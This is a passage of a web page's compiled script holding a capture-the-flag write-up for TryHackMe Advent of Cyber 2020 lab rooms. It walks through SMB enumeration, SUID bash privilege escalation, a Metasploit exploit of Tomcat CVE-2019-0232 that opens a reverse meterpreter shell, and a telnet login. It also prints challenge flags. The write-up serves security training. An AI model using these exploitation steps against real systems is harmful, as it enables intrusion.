(1525): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@tbfc-ftp-01:~# whoami\nwhoami\nroot\n")),(0,i.kt)("p",null,"Now, that we are root, we can read ",(0,i.kt)("inlineCode",{parentName:"p"},"/root/flag.txt")," and get the flag!"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"root@tbfc-ftp-01:~# cat /root/flag.txt\ncat /root/flag.txt\nTHM{even_you_can_be_santa}\n")),(0,i.kt)("p",null,"Flag: ",(0,i.kt)("inlineCode",{parentName:"p"},"THM{even_you_can_be_santa}")),(0,i.kt)("h2",{id:"day-10-dont-be-elfish"},"Day 10: Don't be Elfish!"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Networking"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: SMB")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Get hands-on with Samba, a protocol used for sharing resources like files and printers with other devices.")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.111.123")),(0,i.kt)("h3",{id:"getting-enum4linux"},"Getting Enum4Linux"),(0,i.kt)("p",null,(0,i.kt)("a",{parentName:"p",href:"https://github.com/CiscoCXSecurity/enum4linux/blob/master/enum4linux.pl"},"Click here to view ",(0,i.kt)("inlineCode",{parentName:"a"},"enum4linux.pl")," on GitHub"),"  "),(0,i.kt)("p",null,"(It can also be found on the THM Attackbox here: ",(0,i.kt)("inlineCode",{parentName:"p"},"/root/Desktop/Tools/Miscellaneous/enum4linux.pl"),")"),(0,i.kt)("h3",{id:"basic-enumeration-4"},"Basic Enumeration"),(0,i.kt)("p",null,"We can begin by looking for users and shares on the box using this command:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"./enum4linux.pl -U -S 10.10.111.123\n")),(0,i.kt)("p",null,"And we find the following 3 users:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"}," ============================== \n|    Users on 10.10.111.123    |\n ============================== \nindex: 0x1 RID: 0x3e8 acb: 0x00000010 Account: elfmcskidy       Name:   Desc: \nindex: 0x2 RID: 0x3ea acb: 0x00000010 Account: elfmceager       Name: elfmceager        Desc: \nindex: 0x3 RID: 0x3e9 acb: 0x00000010 Account: elfmcelferson    Name:   Desc: \n\nuser:[elfmcskidy] rid:[0x3e8]\nuser:[elfmceager] rid:[0x3ea]\nuser:[elfmcelferson] rid:[0x3e9]\n")),(0,i.kt)("p",null,"We also find the following 4 shares:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"}," ========================================== \n|    Share Enumeration on 10.10.111.123    |\n ========================================== \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        tbfc-hr         Disk      tbfc-hr\n        tbfc-it         Disk      tbfc-it\n        tbfc-santa      Disk      tbfc-santa\n        IPC$            IPC       IPC Service (tbfc-smb server (Samba, Ubuntu))\n")),(0,i.kt)("h3",{id:"connecting-to-the-samba-server"},"Connecting to the Samba server"),(0,i.kt)("p",null,"We can use smbclient to connect to the Samba servers. After some testing, I noticed that the tbfc-santa share doesn't require a password to login as root."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"smbclient -U root //10.10.111.123/tbfc-santa\n")),(0,i.kt)("p",null,"After logging in, we find the ",(0,i.kt)("inlineCode",{parentName:"p"},"jingle-tunes")," directory and the ",(0,i.kt)("inlineCode",{parentName:"p"},"note_from_mcskidy.txt")," file."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"smb: \\> ls\n  .                                   D        0  Wed Nov 11 21:12:07 2020\n  ..                                  D        0  Wed Nov 11 20:32:21 2020\n  jingle-tunes                        D        0  Wed Nov 11 21:10:41 2020\n  note_from_mcskidy.txt               N      143  Wed Nov 11 21:12:07 2020\n\n                10252564 blocks of size 1024. 5200032 blocks available\n")),(0,i.kt)("p",null,"There is nothing else for us to look at. This is also the end of this challenge."),(0,i.kt)("h2",{id:"day-11-the-rogue-gnome"},"Day 11: The Rogue Gnome"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Networking"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: Privilege Escalation, Linux")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"We've got initial access, but now what? Learn some of the common linux privilege escalation techniques used to gain permissions to things that we shouldn't...")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.43.93")),(0,i.kt)("h3",{id:"basic-questions"},"Basic Questions"),(0,i.kt)("h4",{id:"what-type-of-privilege-escalation-involves-using-a-user-account-to-execute-commands-as-an-administrator"},"What type of privilege escalation involves using a user account to execute commands as an administrator?"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"vertical")),(0,i.kt)("h4",{id:"what-is-the-name-of-the-file-that-contains-a-list-of-users-who-are-a-part-of-the-sudo-group"},"What is the name of the file that contains a list of users who are a part of the sudo group?"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"sudoers")),(0,i.kt)("h3",{id:"connecting-via-ssh"},"Connecting via SSH"),(0,i.kt)("p",null,"For this challenge, we assume we have found a vulnerability to get a shell on the box. We can simulate this using an SSH connection with the credentials: ",(0,i.kt)("inlineCode",{parentName:"p"},"cmnatic:aoc2020"),"."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"ssh cmnatic@10.10.43.93\n")),(0,i.kt)("p",null,"After connecting, we are greated with a bash shell:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Last login: Fri Dec 11 18:17:18 2020 from 10.6.23.34\n-bash-4.4$ whoami\ncmnatic\n")),(0,i.kt)("h3",{id:"privilege-escalation"},"Privilege Escalation"),(0,i.kt)("p",null,"Unfortunately (and unsurprisingly), the account we are given doesn't have root privileges.  "),(0,i.kt)("p",null,"As suggested by THM, we can probably find a SUID binary to exploit. We can look for them by running:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"find / -perm -u=s -type f 2>/dev/null\n")),(0,i.kt)("p",null,"And we get the following output (note: I have ommited all of the snap files):"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"-bash-4.4$ find / -perm -u=s -type f 2>/dev/null\n/bin/umount\n/bin/mount\n/bin/su\n/bin/fusermount\n/bin/bash\n/bin/ping\n/usr/bin/newgidmap\n/usr/bin/at\n/usr/bin/sudo\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/pkexec\n/usr/bin/newuidmap\n/usr/bin/traceroute6.iputils\n/usr/bin/chsh\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\n/usr/lib/snapd/snap-confine\n")),(0,i.kt)("p",null,"OMG, ",(0,i.kt)("inlineCode",{parentName:"p"},"/bin/bash")," is a SUID binary?!?! Ok, this looks really easy! I check out the ",(0,i.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/gtfobins/bash/"},"GTFObins")," entry for bash and find out how to run it using SUID. Turns out all I need to type is ",(0,i.kt)("inlineCode",{parentName:"p"},"/bin/bash -p"),". I run that command and boom, I have a shell as root!"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"bash-4.4# whoami\nroot\n")),(0,i.kt)("p",null,(0,i.kt)("strong",{parentName:"p"},(0,i.kt)("em",{parentName:"strong"},"Another way to find the misconfigured SUID binaries would be to use ",(0,i.kt)("a",{parentName:"em",href:"https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS"},"Linpeas")))),(0,i.kt)("h3",{id:"getting-the-flag-3"},"Getting the flag"),(0,i.kt)("p",null,"Now that I am root, getting the flag is very straight forward. All we need to do is ",(0,i.kt)("inlineCode",{parentName:"p"},"cat")," the flag!"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"cat /root/flag.txt\n")),(0,i.kt)("p",null,"Flag: ",(0,i.kt)("inlineCode",{parentName:"p"},"thm{2fb10afe933296592}")),(0,i.kt)("h2",{id:"day-12-ready-set-elf"},"Day 12: Ready, set, elf!"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Networking"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: Public Exploits")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Learn how vulnerabilities can be identified, use public knowledgebases to search for exploits and leverage these on this Windows box; So quit slackin' and get whackin'!")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.143.182")),(0,i.kt)("h3",{id:"vulnerability-knowledge-bases"},"Vulnerability Knowledge Bases"),(0,i.kt)("p",null,"Examples include:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Rapid7"),(0,i.kt)("li",{parentName:"ul"},"AttackerKB"),(0,i.kt)("li",{parentName:"ul"},"MITRE"),(0,i.kt)("li",{parentName:"ul"},"Exploit-DB")),(0,i.kt)("h3",{id:"basic-enumeration-5"},"Basic enumeration"),(0,i.kt)("p",null,"Before we begin, we ping the machine:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"bluemoon@dragonfly:~/ctf/thm/thm-advent/day12-ready-set-elf$ ping 10.10.143.182\nPING 10.10.143.182 (10.10.143.182) 56(84) bytes of data.\n^C\n--- 10.10.143.182 ping statistics ---\n4 packets transmitted, 0 received, 100% packet loss, time 3065ms\n")),(0,i.kt)("p",null,"Interesting, this machine doesn't respond to ping requests... anyways, we shall forge ahead."),(0,i.kt)("p",null,"First, we can use Nmap to scan the machine."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"nmap -sC -sV -Pn -oN nmap.log 10.10.143.182\n")),(0,i.kt)("p",null,"We get the following results:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-log"},"# Nmap 7.80 scan initiated Sat Dec 12 14:14:26 2020 as: nmap -sC -sV -Pn -oN nmap.log 10.10.143.182\nNmap scan report for 10.10.143.182\nHost is up (0.11s latency).\nNot shown: 997 filtered ports\nPORT     STATE SERVICE       VERSION\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: TBFC-WEB-01\n|   NetBIOS_Domain_Name: TBFC-WEB-01\n|   NetBIOS_Computer_Name: TBFC-WEB-01\n|   DNS_Domain_Name: tbfc-web-01\n|   DNS_Computer_Name: tbfc-web-01\n|   Product_Version: 10.0.17763\n|_  System_Time: 2020-12-12T19:14:46+00:00\n| ssl-cert: Subject: commonName=tbfc-web-01\n| Not valid before: 2020-11-27T01:29:04\n|_Not valid after:  2021-05-29T01:29:04\n|_ssl-date: 2020-12-12T19:14:47+00:00; -1s from scanner time.\n8009/tcp open  ajp13         Apache Jserv (Protocol v1.3)\n| ajp-methods: \n|_  Supported methods: GET HEAD POST OPTIONS\n8080/tcp open  http          Apache Tomcat 9.0.17\n|_http-favicon: Apache Tomcat\n|_http-title: Apache Tomcat/9.0.17\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Sat Dec 12 14:14:48 2020 -- 1 IP address (1 host up) scanned in 21.81 seconds\n")),(0,i.kt)("h3",{id:"what-is-the-version-number-of-the-web-server"},"What is the version number of the web server?"),(0,i.kt)("p",null,"We can see the HTTP Apache Tomcat server is running on port 8080. In the Nmap scan, we can also see that the version number is ",(0,i.kt)("inlineCode",{parentName:"p"},"9.0.17"),"."),(0,i.kt)("p",null,"Here is what the webpage looks like if we open it in a browser:"),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(55482).Z,width:"1600",height:"770"})),(0,i.kt)("p",null,"Based on the lesson writeup from CMNatic, I also check out ",(0,i.kt)("inlineCode",{parentName:"p"},"http://10.10.143.182:8080/cgi-bin/elfwhacker.bat")," and I found this:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"-------------------------------------------------------\nWritten by ElfMcEager for The Best Festival Company ~CMNatic\n-------------------------------------------------------\n\nCurrent time: 12/12/2020 20:33:34.06\n\n-------------------------------------------------------\n                 Debugging Information\n-------------------------------------------------------\nHostname: TBFC-WEB-01\nUser: tbfc-web-01\\elfmcskidy\n\n-------------------------------------------------------\n                  ELF WHACK COUNTER\n-------------------------------------------------------\n\n Number of Elves whacked and sent back to work: 31469\n")),(0,i.kt)("h3",{id:"finding-the-vulnerability-using-searchsploit"},"Finding the vulnerability using searchsploit"),(0,i.kt)("p",null,"I used ",(0,i.kt)("a",{parentName:"p",href:"https://www.cvedetails.com/version/280286/Apache-Tomcat-9.0.17.html"},"CVE Details")," to find the vulnerabilities affecting ",(0,i.kt)("inlineCode",{parentName:"p"},"Apache Tomcat v9.0.17"),"."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(30614).Z,width:"1396",height:"393"})),(0,i.kt)("p",null,"I then found out that ",(0,i.kt)("a",{parentName:"p",href:"https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-887/version_id-280286/year-2019/opec-1/Apache-Tomcat-9.0.17.html"},(0,i.kt)("inlineCode",{parentName:"a"},"CVE-2019-0232"))," would allow me to gain remote code execution."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(57353).Z,width:"1403",height:"364"})),(0,i.kt)("p",null,"The description say:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"When running on Windows with enableCmdLineArguments enabled, the CGI Servlet in Apache Tomcat 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39 and 7.0.0 to 7.0.93 is vulnerable to Remote Code Execution due to a bug in the way the JRE passes command line arguments to Windows. The CGI Servlet is disabled by default. The CGI option enableCmdLineArguments is disable by default in Tomcat 9.0.x (and will be disabled by default in all versions in response to this vulnerability). For a detailed explanation of the JRE behaviour, see Markus Wulftange's blog (https://codewhitesec.blogspot.com/2016/02/java-and-command-line-injections-in-windows.html) and this archived MSDN blog (https://web.archive.org/web/20161228144344/https://blogs.msdn.microsoft.com/twistylittlepassagesallalike/2011/04/23/everyone-quotes-command-line-arguments-the-wrong-way/).\n")),(0,i.kt)("h3",{id:"running-the-exploit-using-metasploit"},"Running the exploit using Metasploit"),(0,i.kt)("p",null,"We start metasploit by running ",(0,i.kt)("inlineCode",{parentName:"p"},"msfconsole"),"."),(0,i.kt)("p",null,"First, we search and select the exploit we would like to use:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"msf6 > search 2019-0232\n\nMatching Modules\n================\n\n   #  Name                                         Disclosure Date  Rank       Check  Description\n   -  ----                                         ---------------  ----       -----  -----------\n   0  exploit/windows/http/tomcat_cgi_cmdlineargs  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability\n\n\nmsf6 > use exploit/windows/http/tomcat_cgi_cmdlineargs\n[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp\nmsf6 exploit(windows/http/tomcat_cgi_cmdlineargs) >\n")),(0,i.kt)("p",null,"Next, let's check out which options we need to set:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > show options\n\nModule options (exploit/windows/http/tomcat_cgi_cmdlineargs):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT      8080             yes       The target port (TCP)\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\n   TARGETURI  /                yes       The URI path to CGI script\n   VHOST                       no        HTTP server virtual host\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     172.16.57.163    yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Apache Tomcat 9.0 or prior for Windows\n")),(0,i.kt)("p",null,"We need to set the ",(0,i.kt)("inlineCode",{parentName:"p"},"RHOST")," to the THM box, the ",(0,i.kt)("inlineCode",{parentName:"p"},"LHOST")," to my Try Hack Me IP address and the ",(0,i.kt)("inlineCode",{parentName:"p"},"TARGETURI")," to ",(0,i.kt)("inlineCode",{parentName:"p"},"/cgi-bin/elfwhacker.bat"),"."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set RHOSTS 10.10.143.182\nRHOSTS => 10.10.143.182\nmsf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set LHOSTS 10.6.23.34\nLHOST => 10.6.23.34\nmsf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set TARGETURI /cgi-bin/elfwhacker.bat\nTARGETURI => /cgi-bin/elfwhacker.bat\n")),(0,i.kt)("p",null,"Then, I can run the exploit to get a shell!"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > run\n\n[*] Started reverse TCP handler on 10.6.23.34:4444 \n[*] Executing automatic check (disable AutoCheck to override)\n[+] The target is vulnerable.\n[*] Command Stager progress -   6.95% done (6999/100668 bytes)\n[*] Command Stager progress -  13.91% done (13998/100668 bytes)\n[*] Command Stager progress -  20.86% done (20997/100668 bytes)\n[*] Command Stager progress -  27.81% done (27996/100668 bytes)\n[*] Command Stager progress -  34.76% done (34995/100668 bytes)\n[*] Command Stager progress -  41.72% done (41994/100668 bytes)\n[*] Command Stager progress -  48.67% done (48993/100668 bytes)\n[*] Command Stager progress -  55.62% done (55992/100668 bytes)\n[*] Command Stager progress -  62.57% done (62991/100668 bytes)\n[*] Command Stager progress -  69.53% done (69990/100668 bytes)\n[*] Command Stager progress -  76.48% done (76989/100668 bytes)\n[*] Command Stager progress -  83.43% done (83988/100668 bytes)\n[*] Command Stager progress -  90.38% done (90987/100668 bytes)\n[*] Command Stager progress -  97.34% done (97986/100668 bytes)\n[*] Command Stager progress - 100.02% done (100692/100668 bytes)\n[*] Sending stage (175174 bytes) to 10.10.143.182\n[*] Meterpreter session 1 opened (10.6.23.34:4444 -> 10.10.143.182:49907) at 2020-12-12 15:39:53 -0500\n\nmeterpreter > shell\nProcess 3992 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.17763.737]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT\\WEB-INF\\cgi-bin>whoami\nwhoami\ntbfc-web-01\\elfmcskidy\n\n")),(0,i.kt)("h3",{id:"getting-the-flag-4"},"Getting the flag"),(0,i.kt)("p",null,"Now that we have a Windows Command Prompt, the real challenge has begun: actually using it LOL (ok, you see, i'm much more comfortable in a UNIX terminal...)"),(0,i.kt)("p",null,"We use ",(0,i.kt)("inlineCode",{parentName:"p"},"dir")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"type")," instead of ",(0,i.kt)("inlineCode",{parentName:"p"},"ls")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"cat")," respectively."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT\\WEB-INF\\cgi-bin>dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is 4277-4242\n\n Directory of C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT\\WEB-INF\\cgi-bin\n\n12/12/2020  20:39    <DIR>          .\n12/12/2020  20:39    <DIR>          ..\n19/11/2020  21:39               825 elfwhacker.bat\n19/11/2020  22:06                27 flag1.txt\n12/12/2020  20:39            73,802 vzlXv.exe\n               3 File(s)         74,654 bytes\n               2 Dir(s)  13,497,925,632 bytes free\n\nC:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps\\ROOT\\WEB-INF\\cgi-bin>type flag1.txt\ntype flag1.txt\nthm{whacking_all_the_elves}\n")),(0,i.kt)("p",null,"And now we have the flag!"),(0,i.kt)("p",null,"Flag: ",(0,i.kt)("inlineCode",{parentName:"p"},"thm{whacking_all_the_elves}")),(0,i.kt)("h3",{id:"privilege-escalation-1"},"Privilege Escalation"),(0,i.kt)("p",null,"There is an extra challenge! Privilege escalation was actually made very very simple with Metasploit."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"meterpreter > getuid\nServer username: TBFC-WEB-01\\elfmcskidy\nmeterpreter > getsystem\n...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n")),(0,i.kt)("p",null,"(note: since this is a windows box, ",(0,i.kt)("inlineCode",{parentName:"p"},"NT AUTHORITY\\SYSTEM == root"),")"),(0,i.kt)("p",null,"Although, I assume there is another flag2.txt or something on this box, unfortunately, I was not able to find it..."),(0,i.kt)("h2",{id:"day-13-coal-for-christmas"},"Day 13: Coal for Christmas"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Special"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: DirtyCow, Privilege Escalation"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Special Contributer: John Hammond")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Kris Kringle checked his Naughty or Nice List, and he saw that more than a few sysadmins were on the naughty list! He went down the chimney and found old, outdated software, deprecated technologies and a whole environment that was so dirty! Take a look at this server and help prove that this house really deserves coal for Christmas!")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.49.209")),(0,i.kt)("h3",{id:"basic-enumeration-6"},"Basic enumeration"),(0,i.kt)("p",null,"We start off with a basic Nmap scan"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sh"},"nmap -sC -sV -oN nmap.log 10.10.49.209\n")),(0,i.kt)("p",null,"We get the following output:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-log"},"# Nmap 7.80 scan initiated Sun Dec 13 13:35:26 2020 as: nmap -sC -sV -oN nmap.log 10.10.49.209\nNmap scan report for 10.10.49.209\nHost is up (0.11s latency).\nNot shown: 997 closed ports\nPORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)\n|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)\n|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)\n23/tcp  open  telnet  Linux telnetd\n111/tcp open  rpcbind 2-4 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100024  1          43633/udp6  status\n|   100024  1          50615/tcp6  status\n|   100024  1          52966/udp   status\n|_  100024  1          58940/tcp   status\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Sun Dec 13 13:35:53 2020 -- 1 IP address (1 host up) scanned in 27.48 seconds\n")),(0,i.kt)("h4",{id:"what-old-deprecated-protocol-and-service-is-running"},"What old, deprecated protocol and service is running?"),(0,i.kt)("p",null,"We can see ",(0,i.kt)("inlineCode",{parentName:"p"},"telnet")," running on port 23. Telnet is the predecessor to SSH. However, unlike SSH, it is unencrypted which means that ",(0,i.kt)("inlineCode",{parentName:"p"},"stdin")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"stdout")," are sent in clear text."),(0,i.kt)("h3",{id:"getting-a-shell-1"},"Getting a shell"),(0,i.kt)("p",null,"We can use telnet to get a shell"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"telnet 10.10.49.209 23\n")),(0,i.kt)("p",null,"Once we attempt to connect, it gives us a username and password!"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Trying 10.10.49.209...\nConnected to 10.10.49.209.\nEscape character is '^]'.\nHI SANTA!!! \n\nWe knew you were coming and we wanted to make\nit easy to drop off presents, so we created\nan account for you to use.\n\nUsername: santa\nPassword: clauschristmas\n\nWe left you cookies and milk!\n")),(0,i.kt)("p",null,"Credentials: ",(0,i.kt)("inlineCode",{parentName:"p"},"santa:clauschristmas")),(0,i.kt)("p",null,"If we log in with these credentials, we get shell!"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Last login: Sat Nov 21 20:37:37 UTC 2020 from 10.0.2.2 on pts/2\n                \\ / \n              --\x3e*<-- \n                /o\\ \n               /_\\_\\ \n              /_/_0_\\ \n             /_o_\\_\\_\\ \n            /_/_/_/_/o\\ \n           /@\\_\\_\\@\\_\\_\\ \n          /_/_/O/_/_/_/_\\ \n         /_\\_\\_\\_\\_\\o\\_\\_\\ \n        /_/0/_/_/_0_/_/@/_\\ \n       /_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\ \n      /_/o/_/_/@/_/_/o/_/0/_\\ \n               [___] \n   \n$ whoami\nsanta\n")),(0,i.kt)("h3",{id:"more-enumeration"},"More enumeration"),(0,i.kt)("p",null,"As suggested, we read ",(0,i.kt)("inlineCode",{parentName:"p"},"/etc/*release")," and run ",(0,i.kt)("inlineCode",{parentName:"p"},"uname -a")," to find info about the system."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'$ cat /etc/*release\nDISTRIB_ID=Ubuntu\nDISTRIB_RELEASE=12.04\nDISTRIB_CODENAME=precise\nDISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"\n$ uname -a\nLinux christmas 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux\n')),(0,i.kt)("p",null,"As we can see, this machine is running ",(0,i.kt)("inlineCode",{parentName:"p"},"Ubuntu 12.04"),"."),(0,i.kt)("h3",{id:"poking-around-the-filesystem"},"Poking around the filesystem"),(0,i.kt)("p",null,"First, let's list the files in the current working directory (Santa's home directory)"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ ls -al\ntotal 20\ndrwxr-xr-x 3 santa santa 4096 Nov 21 20:37 .\ndrwxr-xr-x 3 root  root  4096 Nov 21 20:37 ..\ndrwx------ 2 santa santa 4096 Nov 21 20:37 .cache\n-rwxr-xr-x 1 santa santa 1422 Nov 21 20:37 christmas.sh\n-rw-r--r-- 1 santa santa 2925 Nov 21 20:37 cookies_and_milk.txt\n")),(0,i.kt)("p",null,"Let's read some of these file! Since the files were very long, I have put them into the day13-coal-for-christmas directory."),(0,i.kt)("p",null,"Unfortunately, it the ",(0,i.kt)("inlineCode",{parentName:"p"},"grinch")," seems to have gotten to the cookies and milk first."),(0,i.kt)("h3",{id:"dirtycow-cve-2016-5195"},"DirtyCOW (CVE-2016-5195)"),(0,i.kt)("p",null,"Since this a relatively old version of Ubuntu that has passed the end of service, there could be a vulnerable Linux kernel exploit."),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Version"),(0,i.kt)("th",{parentName:"tr",align:null},"Code Name"),(0,i.kt)("th",{parentName:"tr",align:null},"Release"),(0,i.kt)("th",{parentName:"tr",align:null},"End of life"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Ubuntu 20.04"),(0,i.kt)("td",{parentName:"tr",align:null},"Focal Fossa"),(0,i.kt)("td",{parentName:"tr",align:null},"April 2020"),(0,i.kt)("td",{parentName:"tr",align:null},"TBA")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Ubuntu 18.04"),(0,i.kt)("td",{parentName:"tr",align:null},"Bionic Beaver"),(0,i.kt)("td",{parentName:"tr",align:null},"April 2018"),(0,i.kt)("td",{parentName:"tr",align:null},"April 2028")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Ubuntu 16.04"),(0,i.kt)("td",{parentName:"tr",align:null},"Xenial Xerus"),(0,i.kt)("td",{parentName:"tr",align:null},"April 2016"),(0,i.kt)("td",{parentName:"tr",align:null},"April 2024")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Ubuntu 14.04"),(0,i.kt)("td",{parentName:"tr",align:null},"Trusty Tahr"),(0,i.kt)("td",{parentName:"tr",align:null},"April 2014"),(0,i.kt)("td",{parentName:"tr",align:null},"April 2022")),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Ubuntu 